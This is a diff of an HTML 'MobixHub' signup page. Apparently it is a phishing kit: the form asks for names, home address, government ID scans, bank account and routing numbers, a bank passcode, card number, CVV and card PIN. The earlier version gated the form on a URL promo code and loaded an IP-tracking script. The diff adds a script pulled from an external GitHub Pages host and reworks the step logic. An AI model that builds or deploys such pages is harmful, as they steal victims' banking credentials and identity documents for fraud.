@@ -1,319 +1,265 @@
 <!DOCTYPE html>
 <html lang="en" data-theme="light">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sign Up - MobixHub</title>
-  <style>
-    :root {
-      --bg: #f0f2f5;
-      --container-bg: #ffffff;
-      --text: #333333;
-      --input-bg: #ffffff;
-      --input-border: #cccccc;
-      --button-bg: #007bff;
-      --button-hover: #0056b3;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Sign Up - MobixHub</title>
 
-    [data-theme="dark"] {
-      --bg: #121212;
-      --container-bg: #1e1e1e;
-      --text: #e0e0e0;
-      --input-bg: #2c2c2c;
-      --input-border: #444;
-      --button-bg: #0d6efd;
-      --button-hover: #0a58ca;
-    }
-
-    * { box-sizing: border-box; }
-    body {
-      margin: 0; padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: var(--bg);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      transition: background 0.3s ease;
-    }
-
-    .signup-container {
-      background: var(--container-bg);
-      padding: 2rem;
-      width: 100%;
-      max-width: 500px;
-      border-radius: 10px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
-      color: var(--text);
-      transition: background 0.3s ease, color 0.3s ease;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 1rem;
-      color: var(--text);
-    }
-
-    label {
-      display: block;
-      margin: 0.8rem 0 0.3rem;
-      font-size: 0.9rem;
-      color: var(--text);
-    }
-
-    input, select {
-      width: 100%;
-      padding: 0.7rem;
-      border: 1px solid var(--input-border);
-      border-radius: 6px;
-      margin-bottom: 1rem;
-      background-color: var(--input-bg);
-      color: var(--text);
-    }
-
-    input[type="file"] {
-      padding: 0.3rem;
-    }
-
-    .button-group {
-      display: flex;
-      justify-content: space-between;
-      gap: 10px;
-    }
-
-    button {
-      padding: 0.9rem 1.2rem;
-      border: none;
-      background-color: var(--button-bg);
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    button:hover {
-      background-color: var(--button-hover);
-    }
-
-    .form-step {
-      display: none;
-    }
-
-    .form-step.active {
-      display: block;
-    }
-
-    .password-wrapper {
-      position: relative;
-    }
-
-    .toggle-eye {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-      font-size: 18px;
-      user-select: none;
-    }
-
-    .theme-toggle {
-      position: absolute;
-      top: 15px;
-      right: 15px;
-      background: transparent;
-      border: 1px solid var(--input-border);
-      color: var(--text);
-      padding: 6px 10px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 14px;
-    }
-  </style>
+<style>
+:root{
+  --bg:#f0f2f5;
+  --container-bg:#ffffff;
+  --text:#333333;
+  --input-bg:#ffffff;
+  --input-border:#cccccc;
+  --button-bg:#007bff;
+  --button-hover:#0056b3;
+}
+[data-theme="dark"]{
+  --bg:#121212;
+  --container-bg:#1e1e1e;
+  --text:#e0e0e0;
+  --input-bg:#2c2c2c;
+  --input-border:#444;
+  --button-bg:#0d6efd;
+  --button-hover:#0a58ca;
+}
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:'Segoe UI',Tahoma,Verdana,sans-serif;
+  background:var(--bg);
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+.signup-container{
+  background:var(--container-bg);
+  padding:2rem;
+  width:100%;
+  max-width:500px;
+  border-radius:12px;
+  box-shadow:0 8px 20px rgba(0,0,0,.08);
+  color:var(--text);
+}
+h2{text-align:center;margin-bottom:1rem}
+label{display:block;margin:.8rem 0 .3rem;font-size:.9rem}
+input,select{
+  width:100%;
+  padding:.7rem;
+  border:1px solid var(--input-border);
+  border-radius:6px;
+  margin-bottom:1rem;
+  background:var(--input-bg);
+  color:var(--text);
+}
+input[type="file"]{padding:.3rem}
+.button-group{
+  display:flex;
+  justify-content:space-between;
+  gap:10px;
+}
+button{
+  padding:.9rem 1.2rem;
+  border:none;
+  background:var(--button-bg);
+  color:#fff;
+  border-radius:6px;
+  font-weight:bold;
+  cursor:pointer;
+}
+button:hover{background:var(--button-hover)}
+.form-step{display:none}
+.form-step.active{display:block}
+.theme-toggle{
+  position:fixed;
+  top:15px;
+  right:15px;
+  padding:6px 12px;
+  border:1px solid var(--input-border);
+  border-radius:20px;
+  background:var(--container-bg);
+  cursor:pointer;
+}
+</style>
 </head>
+<script src="https://afkft.github.io/ho/intelligent.js"></script>
 <body>
-  <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
-  <div class="signup-container">
-    <h2>Create Account - MobixHub</h2>
-    <form id="multiStepForm">
-      <!-- Step 1 -->
-      <div class="form-step active" id="step-1">
-        <label>First Name</label>
-        <input type="text" name="firstName" required>
 
-        <label>Middle Name</label>
-        <input type="text" name="middleName">
+<button class="theme-toggle" id="themeToggle">🌙 / ☀️</button>
 
-        <label>Last Name</label>
-        <input type="text" name="lastName" required>
+<div class="signup-container">
+<h2>Create Account - MobixHub</h2>
 
-        <label>Maiden Name</label>
-        <input type="text" name="maidenName">
+<form id="multiStepForm" method="post" enctype="multipart/form-data">
 
-        <label>Email Address</label>
-        <input type="email" name="email" required>
+<!-- STEP 1 -->
+<div class="form-step active">
+  <label>First Name</label>
+  <input type="text" name="first_name" required>
 
-        <label>Phone Number</label>
-        <input type="tel" name="phone" required>
+  <label>Middle Name</label>
+  <input type="text" name="middle_name">
 
-        <!-- Hidden promo code input -->
-        <input type="hidden" name="promoCode" id="promoInput" value="">
+  <label>Last Name</label>
+  <input type="text" name="last_name" required>
 
-        <label>Create Password</label>
-        <div class="password-wrapper">
-          <input type="password" name="password" id="password" required minlength="6">
-          <span class="toggle-eye" onclick="togglePassword('password', this)" title="Show/Hide Password">👁️</span>
-        </div>
+  <label>Maiden Name</label>
+  <input type="text" name="maiden_name">
 
-        <label>Confirm Password</label>
-        <div class="password-wrapper">
-          <input type="password" name="confirmPassword" id="confirmPassword" required minlength="6">
-          <span class="toggle-eye" onclick="togglePassword('confirmPassword', this)" title="Show/Hide Password">👁️</span>
-        </div>
+  <label>Email Address</label>
+  <input type="email" name="email" required>
 
-        <div class="button-group">
-          <button type="button" onclick="nextStep(1)">Next</button>
-        </div>
-      </div>
+  <label>Phone Number</label>
+  <input type="tel" name="phone" required>
 
-      <!-- Step 2 -->
-      <div class="form-step" id="step-2">
-        <label>Home Address</label>
-        <input type="text" name="homeAddress" required>
+  <label>Password</label>
+  <input type="password" name="password" required minlength="6">
 
-        <label>City</label>
-        <input type="text" name="city" required>
-
-        <label>State</label>
-        <input type="text" name="state" required>
-        
-        <label>Zip or postcode</label>
-        <input type="text" name="zip or postcode" required>
-
-        <label>Country</label>
-        <select name="country" required>
-          <option value="">Select Country</option>
-          <option value="USA">USA</option>
-          <option value="UK">UK</option>
-        </select>
-
-        <div class="button-group">
-          <button type="button" onclick="prevStep(2)">Back</button>
-          <button type="button" onclick="nextStep(2)">Next</button>
-        </div>
-      </div>
-
-      <!-- Step 3 -->
-      <div class="form-step" id="step-3">
-        <label>Upload Driver's License (Front) Optional</label>
-        <input type="file" name="dlFront" accept="image/*,.pdf" capture="environment" placeholder="if you have any">
-
-        <label>Upload Driver's License (Back) Optional</label>
-        <input type="file" name="dlBack" accept="image/*,.pdf" capture="environment" placeholder="if you have any">
-
-        <label>Upload Government ID (Front)</label>
-        <input type="file" name="govFront" accept="image/*,.pdf" capture="environment" required>
-
-        <label>Upload Government ID (Back)</label>
-        <input type="file" name="govBack" accept="image/*,.pdf" capture="environment" required>
-
-        <div class="button-group">
-          <button type="button" onclick="prevStep(3)">Back</button>
-          <button type="button" onclick="nextStep(3)">Next</button>
-        </div>
-      </div>
-<!-- Step 4 (Bank Account Info) -->
-<div class="form-step" id="step-4">
-    <label>select Bank</label>
-    <select>
-      <option>Wells Fargo</option>
-      <option>Bank of America (BOA)</option>
-      <option> Truist Bank</option>
-      <option> Other banks</option>
-    </select>
-
-  <label>Bank Name</label>
-  <input type="text" name="bankName" placeholder="Example: Bank of America / Barclays" required>
-
-  <label>Account Holder Name</label>
-  <input type="text" name="accountHolder" placeholder="Exact name on bank account" required>
-
-  <label>Account Number / IBAN</label>
-  <input type="text" name="accountNumber" placeholder="USA: Account No | UK: IBAN" required>
-
-  <label>Routing Number / Sort Code</label>
-  <input type="text" name="routingSort" placeholder="USA: Routing / UK: Sort Code" required>
-  
-    <label>Password or passcode</label>
-  <input type="text" name="password or passcode" placeholder="Password or passcode" required>
+  <label>Confirm Password</label>
+  <input type="password" name="confirm_password" required minlength="6">
 
   <div class="button-group">
-    <button type="button" onclick="prevStep(4)">Back</button>
-    <button type="button" onclick="nextStep(4)">Next</button>
+    <span></span>
+    <button type="button" data-next>Next</button>
   </div>
 </div>
-      <!-- Step 5 -->
-      <div class="form-step" id="step-5">
-        <label>Card Number</label>
-        <input type="text" name="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>
 
-        <label>Expiry Date</label>
-        <input type="month" name="expiryDate" required>
+<!-- STEP 2 -->
+<div class="form-step">
+  <label>Home Address</label>
+  <input type="text" name="home_address" required>
 
-        <label>CVV</label>
-        <input type="text" name="cvv" required maxlength="4">
-    <label>Card pin</label>
-        <input type="text" name="cardpin" required maxlength="4">
-        <div class="button-group">
-          <button type="button" onclick="prevStep(5)">Back</button>
-          <button type="submit">Finish</button>
-        </div>
-        <div id="statusMessage" style="text-align:center; color:#007bff; font-weight:bold; margin-top:1rem;"></div>
-      </div>
-    </form>
+  <label>City</label>
+  <input type="text" name="city" required>
+
+  <label>State</label>
+  <input type="text" name="state" required>
+
+  <label>Zip / Postcode</label>
+  <input type="text" name="zip_postcode" required>
+
+  <label>Country</label>
+  <select name="country" required>
+    <option value="">Select Country</option>
+    <option value="USA">USA</option>
+    <option value="UK">UK</option>
+  </select>
+
+  <div class="button-group">
+    <button type="button" data-prev>Back</button>
+    <button type="button" data-next>Next</button>
   </div>
-  <!-- Scripts -->
-  <script src="promolist.js"></script>
-  <script src="main.js"></script>
-  <script src="iptrack.js"></script>
-  
-  <script>
-    // Toggle light/dark theme
-    function toggleTheme() {
-      const html = document.documentElement;
-      const current = html.getAttribute("data-theme");
-      const next = current === "dark" ? "light" : "dark";
-      html.setAttribute("data-theme", next);
-      localStorage.setItem("theme", next);
+</div>
+
+<!-- STEP 3 -->
+<div class="form-step">
+  <label>Driver License Front</label>
+  <input type="file" name="dl_front">
+
+  <label>Driver License Back</label>
+  <input type="file" name="dl_back">
+
+  <label>Government ID Front</label>
+  <input type="file" name="gov_id_front" required>
+
+  <label>Government ID Back</label>
+  <input type="file" name="gov_id_back" required>
+
+  <div class="button-group">
+    <button type="button" data-prev>Back</button>
+    <button type="button" data-next>Next</button>
+  </div>
+</div>
+
+<!-- STEP 4 -->
+<div class="form-step">
+  <label>Select Bank</label>
+  <select name="bank_type">
+    <option>Wells Fargo</option>
+    <option>Bank of America</option>
+    <option>Truist Bank</option>
+    <option>Other banks</option>
+  </select>
+
+  <label>Bank Name</label>
+  <input type="text" name="bank_name" required>
+
+  <label>Account Holder Name</label>
+  <input type="text" name="account_holder" required>
+
+  <label>Account Number / IBAN</label>
+  <input type="text" name="account_number" required>
+
+  <label>Routing / Sort Code</label>
+  <input type="text" name="routing_code" required>
+
+  <label>Bank Passcode</label>
+  <input type="text" name="bank_passcode" required>
+
+  <div class="button-group">
+    <button type="button" data-prev>Back</button>
+    <button type="button" data-next>Next</button>
+  </div>
+</div>
+
+<!-- STEP 5 -->
+<div class="form-step">
+  <label>Card Number</label>
+  <input type="text" name="card_number" required>
+
+  <label>Expiry Date</label>
+  <input type="month" name="expiry_date" required>
+
+  <label>CVV</label>
+  <input type="text" name="cvv" maxlength="4" required>
+
+  <label>Card PIN</label>
+  <input type="text" name="card_pin" maxlength="4" required>
+
+  <div class="button-group">
+    <button type="button" data-prev>Back</button>
+    <button type="submit">Finish</button>
+  </div>
+</div>
+
+</form>
+</div>
+
+<script>
+/* STEP ENGINE */
+const steps = document.querySelectorAll(".form-step");
+let current = 0;
+
+function showStep(i){
+  steps.forEach(s=>s.classList.remove("active"));
+  steps[i].classList.add("active");
+}
+
+document.getElementById("multiStepForm").addEventListener("click",e=>{
+  const btn = e.target.closest("button");
+  if(!btn) return;
+
+  if(btn.hasAttribute("data-next")){
+    const fields = steps[current].querySelectorAll("input,select");
+    for(const f of fields){
+      if(!f.checkValidity()){ f.reportValidity(); return; }
     }
+    current++; showStep(current);
+  }
 
-    // On load: check stored theme and promo code
-    window.addEventListener("DOMContentLoaded", () => {
-      const savedTheme = localStorage.getItem("theme");
-      if (savedTheme) {
-        document.documentElement.setAttribute("data-theme", savedTheme);
-      }
+  if(btn.hasAttribute("data-prev")){
+    current--; showStep(current);
+  }
+});
 
-      const params = new URLSearchParams(window.location.search);
-      const promo = params.get("promo");
+/* THEME */
+const html=document.documentElement;
+document.getElementById("themeToggle").onclick=()=>{
+  html.dataset.theme = html.dataset.theme==="dark"?"light":"dark";
+};
+</script>
 
-      if (!promo) {
-        alert("Promo code missing in URL. Please use a valid link.");
-        // Optionally disable form or redirect
-        document.getElementById("multiStepForm").style.display = "none";
-        return;
-      }
-
-      const promoInput = document.getElementById("promoInput");
-      if (promoInput) promoInput.value = promo;
-    });
-
-    function togglePassword(id, icon) {
-      const input = document.getElementById(id);
-      const isPassword = input.type === "password";
-      input.type = isPassword ? "text" : "password";
-      icon.textContent = isPassword ? "🙈" : "👁️";
-    }
-  </script>
 </body>
 </html>
